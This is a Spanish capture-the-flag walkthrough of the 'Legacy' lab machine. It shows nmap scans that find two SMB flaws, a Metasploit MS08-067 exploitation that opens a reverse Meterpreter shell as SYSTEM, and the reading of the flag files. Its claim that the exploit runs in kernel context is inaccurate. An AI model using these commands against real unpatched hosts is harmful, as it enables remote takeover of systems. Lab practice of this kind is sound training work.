Resumen

Legacy hace honor a su nombre: un Windows XP que lleva sin parchear desde 2008. Dos vulnerabilidades críticas de SMB, separadas por nueve años, y cualquiera de las dos sirve.

Reconocimiento

┌──(jaime㉿kali)-[~]└─$ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.4

3 puertos abiertos, todos de SMB y RPC:

PuertoServicio
135msrpc
139netbios-ssn
445microsoft-ds
┌──(jaime㉿kali)-[~]└─$ nmap -sCV -p135,139,445 10.10.10.4
Service Info: OSs: Windows, Windows XP

Un Windows XP expuesto en red ya es en sí mismo el hallazgo: Microsoft dejó de darle soporte en 2014.

Enumeración

Lanzo los scripts de vulnerabilidades de SMB:

┌──(jaime㉿kali)-[~]└─$ nmap -p445 --script smb-vuln-* 10.10.10.4
| smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | IDs: CVE:CVE-2008-4250 | | smb-vuln-ms17-010: | VULNERABLE: | IDs: CVE:CVE-2017-0143

Dos caminos:

VulnerabilidadCVEAño
MS08-067 — desbordamiento en el servicio ServerCVE-2008-42502008
MS17-010 — EternalBlueCVE-2017-01432017

Voy con MS08-067, que es la clásica de esta máquina. El fallo está en la función NetPathCanonicalize del servicio Server: una ruta manipulada provoca un desbordamiento de pila y permite ejecutar código sin autenticarse.

Explotación

msf6 > use exploit/windows/smb/ms08_067_netapi msf6 exploit(ms08_067_netapi) > set RHOSTS 10.10.10.4 msf6 exploit(ms08_067_netapi) > set LHOST 10.10.14.X msf6 exploit(ms08_067_netapi) > run
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability... [*] Meterpreter session 1 opened
meterpreter > getuid Server username: NT AUTHORITY\SYSTEM

De nuevo el exploit se ejecuta en contexto de kernel, así que la shell entra directamente como NT AUTHORITY\SYSTEM.

Si el módulo falla, prueba a fijar el objetivo a mano con show targets y set target. Con XP SP3 en español el offset automático no siempre acierta.

Flags

C:\> type C:\Documents and Settings\john\Desktop\user.txt C:\> type C:\Documents and Settings\Administrator\Desktop\root.txt

En XP los perfiles cuelgan de C:\Documents and Settings\, no de C:\Users\ como en Windows 7 en adelante.

Conclusiones

  • Un sistema fuera de soporte es un fallo por sí mismo: nadie va a publicar parches nuevos para XP.
  • MS08-067 fue la vulnerabilidad que usó el gusano Conficker. Diecisiete años después sigue siendo la puerta de entrada de esta máquina.
  • Cuando smb-vuln-* encuentra varias rutas, conviene probar la más antigua primero: suele ser la más estable y la que menos riesgo tiene de tirar el servicio.
